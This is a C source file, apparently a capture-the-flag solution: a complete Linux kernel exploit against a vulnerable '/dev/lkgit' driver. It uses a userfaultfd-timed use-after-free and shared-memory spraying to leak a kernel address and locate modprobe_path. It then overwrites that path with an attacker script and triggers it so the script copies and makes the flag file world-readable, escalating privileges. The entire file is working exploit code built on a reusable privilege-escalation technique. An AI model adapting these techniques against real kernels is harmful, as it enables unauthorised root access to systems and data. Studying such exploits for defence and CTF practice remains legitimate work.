#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <unistd.h>

#define LKGIT_HASH_OBJECT 0xdead0001
#define LKGIT_AMEND_MESSAGE 0xdead0003
#define LKGIT_GET_OBJECT 0xdead0004

#define FILE_MAXSZ 0x40
#define MESSAGE_MAXSZ 0x20
#define HASH_SIZE 0x10

typedef struct
{
    char hash[HASH_SIZE]; // 0x10
    char *content;        // 0x8
    char *message;        // 0x8
} hash_object;

typedef struct
{
    char hash[HASH_SIZE];
    char content[FILE_MAXSZ];
    char message[MESSAGE_MAXSZ];
} log_object;

typedef struct
{
    long uffd;
    unsigned long long page_start;
    void *(*wp_fault_func)(void *);
    void *(*read_fault_func)(void *, struct uffdio_copy*);
} userfd_callback_args;

int lkgit_fd;
pthread_t uffd_thread;

char fileContent1[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
char fileMessage1[] = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
char hash1[0x10];

unsigned long modprobe_path;

void errout(char *msg)
{
    perror(msg);
    exit(-1);
}

void *userfd_thread_func(void *args)
{
    struct uffd_msg msg;

    userfd_callback_args *cb_args = (userfd_callback_args *)args;

    struct pollfd pollfd = {
        .fd = cb_args->uffd,
        .events = POLLIN};

    while (poll(&pollfd, 1, -1) > 0)
    {
        if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
            errout("polling error");

        if (!(pollfd.revents & POLLIN))
            continue;

        if (read(cb_args->uffd, &msg, sizeof(msg)) == 0)
            errout("read uffd event");

        printf("Userfault event\n");
        printf("======================================================================\n");

        if (msg.event & UFFD_EVENT_PAGEFAULT)
            printf("PAGEFAULT : %p / Flags %p\n", (void *)msg.arg.pagefault.address, msg.arg.pagefault.flags);

        long long addr = msg.arg.pagefault.address;
        long long page_begin = addr - (addr % 0x1000);

        // Check for write protected write fault
        if (msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WP)
        {
            printf("UFFD_PAGEFAULT_FLAG_WP\n");

            // If defined, call write protect fault handler
            if(cb_args->wp_fault_func)
                cb_args->wp_fault_func(cb_args);

            // set page to not write protected to unlock kernel
            struct uffdio_writeprotect wp;

            wp.range.start = cb_args->page_start;
            wp.range.len = 0x2000;
            wp.mode = 0;
                        
            printf("[+] Send !UFFDIO_WRITEPROTECT event to userfaultfd\n");
            printf("======================================================================\n\n");
            fflush(stdout);

            if (ioctl(cb_args->uffd, UFFDIO_WRITEPROTECT, &wp) == -1)
            {
                errout("ioctl(UFFDIO_WRITEPROTECT)");
            }
            
            continue;
        }

        // Page wasn't touched by now, so fill it
        printf("UFFDIO_COPY\n");
        char buf[0x1000];

        struct uffdio_copy cp = {
            .src = (long long)buf,
            .dst = (long long)addr,
            .len = (long long)0x1000,
            .mode = 0
        };
                
        // If defined, call read protect fault handler
        if(cb_args->read_fault_func)
            cb_args->read_fault_func(cb_args, &cp);

        if (ioctl(cb_args->uffd, UFFDIO_COPY, &cp) == -1)
        {
            perror("ioctl(UFFDIO_COPY)");
        }

        printf("[+] Sent UFFDIO_COPY event to userfaultfd\n");
        printf("======================================================================\n\n");
        fflush(stdout);
    }
    return NULL;
}

userfd_callback_args* register_userfaultfd(unsigned long long mode, void *(*wp_fault_func)(void *), void *(*read_fault_func)(void *, struct uffdio_copy*))
{
    printf("\n");
    printf("Register userfaultdfd\n");
    printf("======================================================================\n");

    // setup userfault fd
    int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);

    if (uffd == -1)
    {
        perror("syscall");
        exit(-1);
    }

    int uffd_flags = fcntl(uffd, F_GETFD, NULL);

    printf("[+] Userfaultfd registered : FD %d / Flags: %p\n", uffd, uffd_flags);

    struct uffdio_api uffdio_api = {
        .api = UFFD_API,
        .features = 0};

    if (ioctl(uffd, UFFDIO_API, &uffdio_api))
    {
        perror("UFFDIO_API");
        exit(-1);
    }

    printf("[+] Userfaultfd api : Features %p\n", uffdio_api.features);

    char* userfault_region = mmap(NULL, 0x1000 * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);

    if (!userfault_region)
    {
        perror("mmap");
        exit(-1);
    }

    if (posix_memalign((void **)userfault_region, 0x1000, 0x1000 * 2))
    {
        fprintf(stderr, "cannot align by pagesize %d\n", 0x1000);
        exit(1);
    }

    printf("[+] Userfaultfd region : %p - %p", userfault_region, userfault_region + 0x1000 * 2);

    struct uffdio_register uffdio_register;

    uffdio_register.range.start = (unsigned long long)userfault_region;
    uffdio_register.range.len = 0x1000 * 2;
    uffdio_register.mode = mode;

    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    {
        perror("ioctl(UFFDIO_REGISTER)");
        exit(1);
    }

    printf("[+] Userfaultfd region registered: ioctls %p\n", uffdio_register.ioctls);

    userfd_callback_args *cb_args = malloc(sizeof(userfd_callback_args));

    cb_args->uffd = uffd;
    cb_args->wp_fault_func = wp_fault_func;
    cb_args->read_fault_func = read_fault_func;
    cb_args->page_start = (unsigned long long)userfault_region;

    pthread_create(&uffd_thread, NULL, userfd_thread_func, cb_args);

    printf("[+] Userfaultfd process thread started: %p\n", uffd_thread);

    printf("======================================================================\n\n");    

    return cb_args;
}

void unregister_userfaultfd(userfd_callback_args* args) {
    printf("\n");
    printf("Unregister userfaultdfd\n");
    printf("======================================================================\n");

    struct uffdio_range uf_range = {
        .start = args->page_start,
        .len = 0x2000
    };

    if (ioctl(args->uffd, UFFDIO_UNREGISTER, (unsigned long)&uf_range) == -1) 
        errout("unregistering page for userfaultfd");

    if (munmap(args->page_start, 0x2000) == -1)
        errout("munmapping userfaultfd page");

    close(args->uffd);
    pthread_cancel(uffd_thread);
    printf("[+] userfaultfd unregistered\n");
    printf("======================================================================\n\n");
}

// take a snapshot of a file.
char snap_file(char *content, char *message, char *out_hash)
{
    hash_object req = {
        .content = content,
        .message = message,
    };

    if (ioctl(lkgit_fd, LKGIT_HASH_OBJECT, &req) != 0)
    {
        printf("[ERROR] failed to hash the object.\n");
    }

    memcpy(out_hash, &req.hash, 0x10);

    return 0;
}

void spray_shmem(int count, int size) {
    puts("[+] spray shmem structs");
    int shmid;
    char *shmaddr;

    for (int i = 0; i < count; i++)
    {
        if ((shmid = shmget(IPC_PRIVATE, size, 0600)) == -1)
        {
            perror("shmget error");
            exit(-1);
        }
        shmaddr = shmat(shmid, NULL, 0);

        if (shmaddr == (void *)-1)
        {
            perror("shmat error");
            exit(-1);
        }
    }
}

void *break_on_read_leak(void *args, struct uffdio_copy *uf_buf)
{
    userfd_callback_args *cb_args = args;

    puts("Userfault: break_on_read");    

    printf("[+]Delete current object by storing one with the same hash\n");
    snap_file(fileContent1, fileMessage1, &hash1);

    printf("[+] Create a shmem struct in the freed object");
    spray_shmem(1, 0x20);    
}

void *break_on_read_overwrite(void *args, struct uffdio_copy *uf_buf)
{
    userfd_callback_args *cb_args = args;

    // Write address of modprobe_path to hash_object->message
    unsigned long* lptr = fileMessage1+0x18;
    *lptr = modprobe_path;

    // Reallocate files, so that current object is freed and our message
    // will overwrite current object to control its message pointer
    snap_file(fileContent1, fileMessage1, &hash1);
    snap_file(fileContent1, fileMessage1, &hash1);
        
    // Put the content into UFFDIO_COPY src argument (which will be copied to message pointer)
    char mod[] = "/home/user/copy.sh";
    memcpy(uf_buf->src, mod, sizeof(mod));      
}

int main()
{
    // Prepare modprobe_path exploitation
    system("echo -ne '#!/bin/sh\n/bin/cp /home/user/flag /home/user/flag2\n/bin/chmod 777 /home/user/flag2' > /home/user/copy.sh");
    system("chmod +x /home/user/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/dummy");
    system("chmod +x /home/user/dummy");

    lkgit_fd = open("/dev/lkgit", O_RDWR);

    printf("[+] Create initial file in lkgit\n");
    snap_file(fileContent1, fileMessage1, hash1);

    printf("[+] Register userfaultfd\n");
    userfd_callback_args *uffdargs = register_userfaultfd(UFFDIO_REGISTER_MODE_MISSING | UFFDIO_REGISTER_MODE_WP, NULL, break_on_read_leak);

    printf("[+] Request file, and let it break on copying back message\n");
    log_object *req = uffdargs->page_start + 0x1000 - 0x10 - 0x40; // Allow copy hash/content, but pagefault on message
    memcpy(&req->hash, hash1, 0x10);
    ioctl(lkgit_fd, LKGIT_GET_OBJECT, req);

    unsigned long kernel_leak = *((unsigned long*)(req->hash + 0x8));
    modprobe_path = kernel_leak - 0x131ce0;

    printf("[+] Kernel leak   : %p\n", kernel_leak);
    printf("[+] modprobe_path : %p\n", modprobe_path);

    unregister_userfaultfd(uffdargs);

    printf("[+] Register new userfaultfd\n");
    uffdargs = register_userfaultfd(UFFDIO_REGISTER_MODE_MISSING | UFFDIO_REGISTER_MODE_WP, NULL, break_on_read_overwrite);
    
    // Align the request object, so that lkgit_amend_message will pagefault on reading new message
    ioctl(lkgit_fd, LKGIT_AMEND_MESSAGE, uffdargs->page_start+0x1000-0x10-0x40);
    
    close(lkgit_fd);
    
    // Execute modprobe_path exploitation
    system("/home/user/dummy");
    system("cat /home/user/flag2");
}
